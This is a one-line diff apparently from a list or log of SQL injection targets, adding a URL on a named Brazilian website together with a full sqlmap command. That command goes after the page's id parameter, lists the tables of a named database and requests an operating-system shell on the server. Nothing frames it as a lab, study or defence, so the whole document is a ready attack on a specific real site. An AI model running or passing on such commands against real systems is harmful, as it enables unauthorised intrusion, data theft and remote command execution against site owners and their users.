@@ -1,0 +1,1 @@
+http://www.forma3d.com.br/detalhe_noticia.php?id_noticia=18 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.forma3d.com.br/detalhe_noticia.php?id_noticia=18 -D db_forma3d --tables --os-shell
